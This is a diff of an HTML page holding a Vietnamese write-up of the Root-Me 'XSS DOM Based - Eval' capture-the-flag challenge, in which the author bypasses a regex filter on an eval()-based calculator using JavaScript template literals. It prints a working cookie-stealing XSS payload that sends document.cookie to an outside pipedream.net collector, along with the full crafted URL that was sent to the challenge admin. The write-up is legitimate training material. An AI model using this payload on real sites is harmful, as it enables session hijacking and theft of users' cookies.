@@ -170,29 +170,38 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="write-up"><a class="header" href="#write-up">WRITE UP</a></h1>
-<h2 id="challenge-xss-dom-based---eval"><a class="header" href="#challenge-xss-dom-based---eval"><strong>Challenge:</strong> <a href="https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Eval"><strong>XSS DOM Based - Eval</strong></a></a></h2>
-<p>Bài này cần ta thực hiện chèn XSS vào một input tính toán và bị filter bởi regex: <strong>/^\d+[\+|\-|\*|\/]\d+/</strong></p>
-<img src="./media/image1.png" style="width:6.5in;height:3.36944in" alt="Graphical user interface, text, application, email Description automatically generated" />
+                        <h1 id="xss-dom-based---eval"><a class="header" href="#xss-dom-based---eval"><a href="https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Eval"><strong>XSS DOM Based - Eval</strong></a></a></h1>
+<p>Bài này cần ta thực hiện chèn XSS vào một input tính toán và bị filter bởi regex: <code>/^\d+\[\\+|\\-|\\\*|\\/\]\d+/</code></p>
+<p><img src="./media/image1.png" alt="" /></p>
 <p>Tuy vậy, sau khi fuzz thì thấy <strong>eval()</strong> cho phép thực thi phép toán <strong>1+1asd:</strong></p>
-<img src="./media/image2.png" style="width:6.5in;height:2.69236in" alt="Graphical user interface, text Description automatically generated" />
+<p><img src="./media/image2.png" alt="" /></p>
 <p>Như vậy, hướng đi của ta là chèn vào ở đây. Ta có script của server:</p>
-<p><em>&lt;script&gt;</em></p>
-<p><em>var result = eval(1+1asd);</em></p>
-<p><em>document.getElementById('state').innerText = '1+1asd = ' + result;</em></p>
-<p><em>&lt;/script&gt;</em></p>
+<pre><code class="language-javascript">&amp;lt;script&amp;gt;
+
+var result = eval(1+1asd);
+
+document.getElementById('state').innerText = '1+1asd = ' + result;
+
+&amp;lt;/script&amp;gt;
+</code></pre>
 <p>Mọi thứ đều bị filter khi cố chèn script vào đây. Đến đây, sau khi mò về Javascript thì mọi thứ có thể giải quyết với template literals (<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals">Template literals (Template strings) - JavaScript | MDN (mozilla.org)</a>). Template literals cho phép ta thực thi một command dưới dạng ưu tiên trước khi bị block (nếu có):</p>
-<p>Thử chèn payload: <strong>1+1`${alert``}`</strong></p>
-<img src="./media/image3.png" style="width:6.5in;height:1.01389in" alt="A screenshot of a computer Description automatically generated" />
+<p>Thử chèn payload:</p>
+<pre><code class="language-bash">1+1\`${alert\`\`}\`
+</code></pre>
+<p><img src="./media/image3.png" alt="" /></p>
 <p>Và như vậy, ta có thể đính kèm DOM Based vào đây:</p>
-<p>Payload: <strong>1+1`${document.location="https://eol9dtzbk9673pb.m.pipedream.net?c="+document.cookie}`</strong></p>
+<p>Payload:</p>
+<pre><code class="language-bash">1+1\`${document.location="https://eol9dtzbk9673pb.m.pipedream.net?c="+document.cookie}\`
+</code></pre>
 <p>Sau 10 giây, ta nhận được HTTP request. Giờ thì chuyển qua tab Contact và send cho admin. Ta có payload như sau: <a href="http://challenge01.root-me.org/web-client/ch34/index.php?calculation=1%2B1%60$%7bdocument.location=%22https://eol9dtzbk9673pb.m.pipedream.net?c=%22%2Bdocument.cookie%7d%60"><em>http://challenge01.root-me.org/web-client/ch34/index.php?calculation=1%2B1`${document.location=%22https://eol9dtzbk9673pb.m.pipedream.net?c=%22%2Bdocument.cookie}`</em></a></p>
-<img src="./media/image4.png" style="width:6.5in;height:2.39167in" alt="Graphical user interface, text, application Description automatically generated" />
+<p><img src="./media/image4.png" alt="" /></p>
 <p>HTTP Request nhận được sau một khoảng thời gian:</p>
-<img src="./media/image5.png" style="width:6.5in;height:2.35in" alt="Graphical user interface, text, application, email Description automatically generated" />
+<p><img src="./media/image5.png" alt="" /></p>
 <p>Done:</p>
-<img src="./media/image6.png" style="width:6.5in;height:3.85139in" alt="Graphical user interface, application Description automatically generated" />
-<p>- Flag: ********************************</p>
+<p><img src="./media/image6.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
 
                     </main>
 
